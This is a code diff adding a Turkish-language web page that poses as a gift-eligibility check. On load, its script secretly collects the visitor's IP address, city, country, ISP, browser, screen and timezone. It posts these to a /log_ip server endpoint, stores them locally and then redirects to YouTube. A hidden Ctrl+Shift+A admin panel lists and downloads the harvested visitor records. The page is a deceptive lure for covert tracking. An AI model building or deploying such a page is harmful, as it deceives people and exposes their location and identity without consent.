@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hediye Kazanma Şansı</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+        }
+        .loading {
+            font-size: 18px;
+            color: #666;
+            margin: 20px 0;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #666;
+        }
+        .btn {
+            background: #007bff;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            text-decoration: none;
+            display: inline-block;
+            margin: 10px;
+        }
+        .btn:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Hediye Kontrolü Yapılıyor...</h1>
+        <div class="spinner"></div>
+        <div class="loading">Hediye uygunluğunuz kontrol ediliyor, lütfen bekleyin...</div>
+        
+        <div class="info" id="info" style="display: none;">
+            <strong>✅ Hediye uygunluğunuz onaylandı!</strong><br>
+            <span id="ip-info"></span><br>
+            <span id="time-info"></span><br>
+            <span id="browser-info"></span>
+        </div>
+        
+        <div id="redirect-info" style="display: none;">
+            <p>🎉 Tebrikler! Hediyenizi almak için yönlendiriliyorsunuz...</p>
+            <a href="https://www.youtube.com" class="btn">Hediyemi Al</a>
+        </div>
+    </div>
+
+    <script>
+        // IP bilgilerini topla ve kaydet
+        async function collectAndSaveIP() {
+            try {
+                // Kullanıcı bilgilerini topla
+                const userInfo = {
+                    timestamp: new Date().toLocaleString('tr-TR'),
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    referrer: document.referrer || 'Direkt erişim',
+                    url: window.location.href
+                };
+
+                // IP adresini al (ücretsiz API kullanarak)
+                let ipInfo = {};
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    userInfo.ip = ipData.ip;
+                    
+                    // Detaylı IP bilgisi al
+                    const detailResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const detailData = await detailResponse.json();
+                    
+                    userInfo.country = detailData.country_name || 'Bilinmiyor';
+                    userInfo.city = detailData.city || 'Bilinmiyor';
+                    userInfo.isp = detailData.org || 'Bilinmiyor';
+                } catch (e) {
+                    userInfo.ip = 'Alınamadı';
+                    userInfo.country = 'Bilinmiyor';
+                    userInfo.city = 'Bilinmiyor';
+                    userInfo.isp = 'Bilinmiyor';
+                }
+
+                // Bilgileri göster
+                document.getElementById('ip-info').textContent = `IP: ${userInfo.ip} (${userInfo.country}, ${userInfo.city})`;
+                document.getElementById('time-info').textContent = `Zaman: ${userInfo.timestamp}`;
+                document.getElementById('browser-info').textContent = `Tarayıcı: ${userInfo.platform}`;
+                document.getElementById('info').style.display = 'block';
+
+                // Bilgileri localStorage'a kaydet (geçici olarak)
+                const logs = JSON.parse(localStorage.getItem('visitor_data') || '[]');
+                logs.push(userInfo);
+                localStorage.setItem('visitor_data', JSON.stringify(logs));
+
+                // Server'a IP bilgilerini gönder
+                try {
+                    await fetch('/log_ip', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(userInfo)
+                    });
+                    console.log('✅ IP bilgileri server\'a gönderildi');
+                } catch (e) {
+                    console.log('⚠️ Server\'a gönderim başarısız:', e);
+                }
+
+                // Email ile gönder (EmailJS kullanarak - isteğe bağlı)
+                // Bu kısmı EmailJS ile yapılandırabilirsiniz
+
+                console.log('Toplanan bilgiler:', userInfo);
+
+            } catch (error) {
+                console.error('Bilgi toplama hatası:', error);
+            }
+
+            // Yönlendirme bilgisini göster
+            document.getElementById('redirect-info').style.display = 'block';
+            
+            // 5 saniye sonra yönlendir
+            setTimeout(() => {
+                window.location.href = 'https://www.youtube.com';
+            }, 5000);
+        }
+
+        // Sayfa yüklendiğinde çalıştır
+        window.onload = function() {
+            setTimeout(collectAndSaveIP, 2000); // 2 saniye bekle
+        };
+
+        // Admin paneli için fonksiyon
+        function showAdminPanel() {
+            const logs = JSON.parse(localStorage.getItem('visitor_data') || '[]');
+            let logText = 'ZİYARETÇİ KAYITLARI\n================\n\n';
+            
+            logs.forEach((log, index) => {
+                logText += `${index + 1}. Ziyaret\n`;
+                logText += `Zaman: ${log.timestamp}\n`;
+                logText += `IP: ${log.ip}\n`;
+                logText += `Konum: ${log.city}, ${log.country}\n`;
+                logText += `ISP: ${log.isp}\n`;
+                logText += `Tarayıcı: ${log.userAgent}\n`;
+                logText += `Platform: ${log.platform}\n`;
+                logText += `Ekran: ${log.screen}\n`;
+                logText += `Dil: ${log.language}\n`;
+                logText += `Saat Dilimi: ${log.timezone}\n`;
+                logText += `Referrer: ${log.referrer}\n`;
+                logText += `URL: ${log.url}\n`;
+                logText += '------------------------\n\n';
+            });
+
+            // Yeni pencerede göster
+            const newWindow = window.open('', '_blank');
+            newWindow.document.write(`
+                <html>
+                <head><title>Ziyaretçi Kayıtları</title></head>
+                <body style="font-family: monospace; padding: 20px;">
+                    <h2>Ziyaretçi Kayıtları (${logs.length} kayıt)</h2>
+                    <button onclick="downloadLogs()">Kayıtları İndir</button>
+                    <button onclick="clearLogs()">Kayıtları Temizle</button>
+                    <pre>${logText}</pre>
+                    <script>
+                        function downloadLogs() {
+                            const element = document.createElement('a');
+                            element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent('${logText}'));
+                            element.setAttribute('download', 'visitor_logs_' + new Date().toISOString().slice(0,19).replace(/:/g, '-') + '.txt');
+                            element.style.display = 'none';
+                            document.body.appendChild(element);
+                            element.click();
+                            document.body.removeChild(element);
+                        }
+                        function clearLogs() {
+                            if(confirm('Tüm kayıtları silmek istediğinizden emin misiniz?')) {
+                                localStorage.removeItem('visitor_data');
+                                location.reload();
+                            }
+                        }
+                    </script>
+                </body>
+                </html>
+            `);
+        }
+
+        // Gizli admin paneli (Ctrl+Shift+A)
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
+                showAdminPanel();
+            }
+        });
+    </script>
+</body>
+</html>
